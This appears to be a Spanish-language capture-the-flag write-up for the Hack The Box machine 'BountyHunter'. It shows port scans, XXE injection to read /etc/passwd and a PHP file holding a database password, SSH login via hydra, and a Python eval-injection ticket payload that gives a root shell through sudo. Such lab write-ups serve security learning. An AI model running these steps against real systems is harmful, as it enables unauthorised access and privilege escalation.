---
layout: single
title: Máquina BountyHunter Hack the Box
comments: true
excerpt: "Máquina BountyHunter Hack the Box"
date: 2022-05-09
classes: wide
header:
  teaser: /assets/images/2022-05-10-BountyHunter/logo.png
  teaser_home_page: true
categories:
  - HacktheBox
tags:
  - Hackthebox
  - linux
  - Hacking
  - Easy
---

Reconocimiento

```abap
┌─[root@parrot]─[/mnt/angussMoody/BountyHunter]
└──╼ #nmap -p- -sS --min-rate 5000 -Pn -n 10.10.11.100 -oG Puertos -oN Puertos.txt
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-29 19:09 -05
Stats: 0:04:55 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 19:14 (0:00:00 remaining)
Nmap scan report for 10.10.11.100
Host is up (0.39s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 456.50 seconds
```

```abap
┌─[root@parrot]─[/mnt/angussMoody/BountyHunter]
└──╼ #nmap -p22,80 -sCV 10.10.11.100 -o nmap
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-29 19:17 -05
Nmap scan report for 10.10.11.100
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.07 seconds
```

tiene una página web

![1.png](/assets/images/2022-05-10-BountyHunter/1.png)

Hay un servicio que envía una data encodeada

![2.png](/assets/images/2022-05-10-BountyHunter/2.png)

Decodeamos esta data para ver lo que nos trae 

![3.png](/assets/images/2022-05-10-BountyHunter/3.png)

y vemos que está realizando una petición XML  y nos encontramos con este articulo  [https://github.com/payloadbox/xxe-injection-payload-list](https://github.com/payloadbox/xxe-injection-payload-list) ahora vamos a tratar de hacer una inyección XXE

hacemos la inyección trayendo un archivo del sistema e inyectando uno de las peticiones y lo pasamos  a base64

![5.png](/assets/images/2022-05-10-BountyHunter/5.png)

Ahora copiamos nuestra cadena de base64 y la pasamos en la petición y lo encodeamos en URL-encode  y hacemos la petición

![6.png](/assets/images/2022-05-10-BountyHunter/6.png)

ahora vemos que podemos leer archivos del sistema 

![7.png](/assets/images/2022-05-10-BountyHunter/7.png)

Después de hacer varias pruebas sin resultados encontramos este archivo [https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity) donde vemos que podemos hacer un llamado de archivos pero que la respuesta sea en base64 

![8.png](/assets/images/2022-05-10-BountyHunter/8.png)

Así que vamos a tratar de hacer una petición de esta manera 

![9.png](/assets/images/2022-05-10-BountyHunter/9.png)

Y vemos que nos responde con un base64 

![10.png](/assets/images/2022-05-10-BountyHunter/10.png)

Decodeamos está cadena de base64 y vemos que es el archivo /etc/passwd que hemos pedido, ahora debemos tratar de buscar archivos interesantes 

```abap
┌─[root@parrot]─[/mnt/angussMoody/BountyHunter]
└──╼ #echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMjo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExMzo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwOToxMTU6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMTA6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTExOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCmRldmVsb3BtZW50Ong6MTAwMDoxMDAwOkRldmVsb3BtZW50Oi9ob21lL2RldmVsb3BtZW50Oi9iaW4vYmFzaApseGQ6eDo5OTg6MTAwOjovdmFyL3NuYXAvbHhkL2NvbW1vbi9seGQ6L2Jpbi9mYWxzZQp1c2JtdXg6eDoxMTI6NDY6dXNibXV4IGRhZW1vbiwsLDovdmFyL2xpYi91c2JtdXg6L3Vzci9zYmluL25vbG9naW4K" | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

ya sabemos que en la página está en php por los archivos que ya hemos consumido, vamos a tratar de leer el archivo log_submit.php 

![11.png](/assets/images/2022-05-10-BountyHunter/11.png)

Realizamos una petición como la anterior en la ruta /var/www/html/log_submit.php

![12.png](/assets/images/2022-05-10-BountyHunter/12.png)

una vez decodeado este archivo vemos su contenido

```abap
┌─[root@parrot]─[/mnt/angussMoody/BountyHunter]
└──╼ #echo "PGh0bWw+CjxoZWFkPgo8c2NyaXB0IHNyYz0iL3Jlc291cmNlcy9qcXVlcnkubWluLmpzIj48L3NjcmlwdD4KPHNjcmlwdCBzcmM9Ii9yZXNvdXJjZXMvYm91bnR5bG9nLmpzIj48L3NjcmlwdD4KPC9oZWFkPgo8Y2VudGVyPgo8aDE+Qm91bnR5IFJlcG9ydCBTeXN0ZW0gLSBCZXRhPC9oMT4KPGlucHV0IHR5cGU9InRleHQiIGlkID0gImV4cGxvaXRUaXRsZSIgbmFtZT0iZXhwbG9pdFRpdGxlIiBwbGFjZWhvbGRlcj0iRXhwbG9pdCBUaXRsZSI+Cjxicj4KPGlucHV0IHR5cGU9InRleHQiIGlkID0gImN3ZSIgbmFtZT0iY3dlIiBwbGFjZWhvbGRlcj0iQ1dFIj4KPGJyPgo8aW5wdXQgdHlwZT0idGV4dCIgaWQgPSAiY3ZzcyIgbmFtZT0iZXhwbG9pdENWU1MiIHBsYWNlaG9sZGVyPSJDVlNTIFNjb3JlIj4KPGJyPgo8aW5wdXQgdHlwZT0idGV4dCIgaWQgPSAicmV3YXJkIiBuYW1lPSJib3VudHlSZXdhcmQiIHBsYWNlaG9sZGVyPSJCb3VudHkgUmV3YXJkICgkKSI+Cjxicj4KPGlucHV0IHR5cGU9InN1Ym1pdCIgb25jbGljayA9ICJib3VudHlTdWJtaXQoKSIgdmFsdWU9IlN1Ym1pdCIgbmFtZT0ic3VibWl0Ij4KPGJyPgo8cCBpZCA9ICJyZXR1cm4iPjwvcD4KPGNlbnRlcj4KPC9odG1sPgo=" | base64 -d

<html>
<head>
<script src="/resources/jquery.min.js"></script>
<script src="/resources/bountylog.js"></script>
</head>
<center>
<h1>Bounty Report System - Beta</h1>
<input type="text" id = "exploitTitle" name="exploitTitle" placeholder="Exploit Title">
<br>
<input type="text" id = "cwe" name="cwe" placeholder="CWE">
<br>
<input type="text" id = "cvss" name="exploitCVSS" placeholder="CVSS Score">
<br>
<input type="text" id = "reward" name="bountyReward" placeholder="Bounty Reward ($)">
<br>
<input type="submit" onclick = "bountySubmit()" value="Submit" name="submit">
<br>
<p id = "return"></p>
<center>
</html>
```

ya sabemos que podemos leer estos archivos, como sabemos que es un php podemos tratar de leer el archivo db.php

![13.png](/assets/images/2022-05-10-BountyHunter/13.png)

y vemos que nos devuelve una cadena en base 64

![14.png](/assets/images/2022-05-10-BountyHunter/14.png)

Después de decodear  esta cadena vemos que nos trae credenciales 

```abap
┌─[root@parrot]─[/mnt/angussMoody/BountyHunter]
└──╼ #echo "PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=" | base64 -d
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

Cómo ya vimos el archivo /etc/passwd los usuarios que tiene una bash son development y root, así que vamos a probar con  estos dos usuarios si podemos ingresar por ssh, para esto vamos a realizar una prueba con hydra

```abap
┌─[✗]─[root@parrot]─[/mnt/angussMoody/BountyHunter]
└──╼ #hydra -L users -p m19RoAU0hP41A1sTsq6K 10.10.11.100 ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-29 20:58:54
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 2 tasks per 1 server, overall 2 tasks, 2 login tries (l:2/p:1), ~1 try per task
[DATA] attacking ssh://10.10.11.100:22/
[22][ssh] host: 10.10.11.100   login: development   password: m19RoAU0hP41A1sTsq6K
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-10-29 20:58:59
```

Vemos que esta contraseña responde al usuario development, así que vamos a ingresar con este usuario por SSH

```abap
┌─[root@parrot]─[/mnt/angussMoody/BountyHunter]
└──╼ #ssh development@10.10.11.100
The authenticity of host '10.10.11.100 (10.10.11.100)' can't be established.
ECDSA key fingerprint is SHA256:3IaCMSdNq0Q9iu+vTawqvIf84OO0+RYNnsDxDBZI04Y.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.100' (ECDSA) to the list of known hosts.
development@10.10.11.100's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 30 Oct 2021 02:16:02 AM UTC

  System load:  0.0               Processes:             216
  Usage of /:   49.1% of 6.83GB   Users logged in:       0
  Memory usage: 31%               IPv4 address for eth0: 10.10.11.100
  Swap usage:   0%

0 updates can be applied immediately.

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Oct 29 21:56:14 2021 from 10.10.14.245
development@bountyhunter:~$ id && hostname && whoami
uid=1000(development) gid=1000(development) groups=1000(development)
bountyhunter
development
development@bountyhunter:~$
```

Vamos a buscar una escalada de privilegios y nos encontramos que podemos ejecutar un archivo con sudo sin contraseña

```abap
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

Revisando el código vemos que tiene varias condicionales

```python
┌─[root@parrot]─[/mnt/angussMoody/BountyHunter]
└──╼ #cat ticketValidator.py 
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: ticketValidator.py
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ #Skytrain Inc Ticket Validation System 0.1
   2   │ #Do not distribute this file.
   3   │ 
   4   │ def load_file(loc):
   5   │     if loc.endswith(".md"):
   6   │         return open(loc, 'r')
   7   │     else:
   8   │         print("Wrong file type.")
   9   │         exit()
  10   │ 
  11   │ def evaluate(ticketFile):
  12   │     #Evaluates a ticket to check for ireggularities.
  13   │     code_line = None
  14   │     for i,x in enumerate(ticketFile.readlines()):
  15   │         if i == 0:
  16   │             if not x.startswith("# Skytrain Inc"):
  17   │                 return False
  18   │             continue
  19   │         if i == 1:
  20   │             if not x.startswith("## Ticket to "):
  21   │                 return False
  22   │             print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
  23   │             continue
  24   │ 
  25   │         if x.startswith("__Ticket Code:__"):
  26   │             code_line = i+1
  27   │             continue
  28   │ 
  29   │         if code_line and i == code_line:
  30   │             if not x.startswith("**"):
  31   │                 return False
  32   │             ticketCode = x.replace("**", "").split("+")[0]
  33   │             if int(ticketCode) % 7 == 4:
  34   │                 validationNumber = eval(x.replace("**", ""))
  35   │                 if validationNumber > 100:
  36   │                     return True
  37   │                 else:
  38   │                     return False
  39   │     return False
  40   │ 
  41   │ def main():
  42   │     fileName = input("Please enter the path to the ticket file.\n")
  43   │     ticket = load_file(fileName)
  44   │     #DEBUG print(ticket)
  45   │     result = evaluate(ticket)
  46   │     if (result):
  47   │         print("Valid ticket.")
  48   │     else:
  49   │         print("Invalid ticket.")
  50   │     ticket.close
  51   │ 
  52   │ main()
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Después de analizar el código y realizar una POC dimos con la escalada

```python
# Skytrain Inc
## Ticket to abel
__Ticket Code:__
**193+__import__('os').system('/bin/bash')
```

nos pasamos este archivo a la máquina y lo ejecutamos para que nos interprete el comando que queremos ejecutar

```python
development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
anguss.md
Destination: abel
root@bountyhunter:/home/development# whoami && id && hostname
root
uid=0(root) gid=0(root) groups=0(root)
bountyhunter
root@bountyhunter:/home/development#
```